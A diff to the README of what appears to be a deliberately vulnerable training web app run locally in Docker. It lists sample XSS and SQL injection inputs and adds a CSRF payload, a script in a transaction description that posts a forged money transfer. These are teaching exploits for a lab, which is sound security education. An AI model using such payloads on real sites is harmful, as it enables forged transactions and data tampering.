@@ -19,7 +19,20 @@
 - as description insert `<script>alert('XSS attack');</script>`
 #### SQL injection
 - go to `http://localhost:8088/?path=list&limit=50;update%20users%20set%20name=%27Anonymous%27;`
-
+#### CSRF
+- need also XSS
+- create new transaction
+- add description insert
+```
+<script>
+$.post({
+    url:'index.php',
+    data:'receiver=11&amount=10&desc=attack&submit=create'
+}).success(function(data) {
+    console.log('Attack was successful');
+});
+</script>
+```
 
 ### Docker tips
 Show all running containers
@@ -42,7 +55,7 @@ docker-compose exec apache bash -l
 ### XSS (Cross-site Scripting)
  - [OWASP XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
  - [OWASP testing for XSS](https://www.owasp.org/index.php/Testing_for_Cross_site_scripting)
- 
+
  - [PHP triky: Cross-Site Request Forgery](https://php.vrana.cz/cross-site-request-forgery.php) (czech only)
  - [Co je Cross-Site Request Forgery a jak se mu bránit](https://www.zdrojak.cz/clanky/co-je-cross-site-request-forgery-a-jak-se-branit/) (czech only)
 
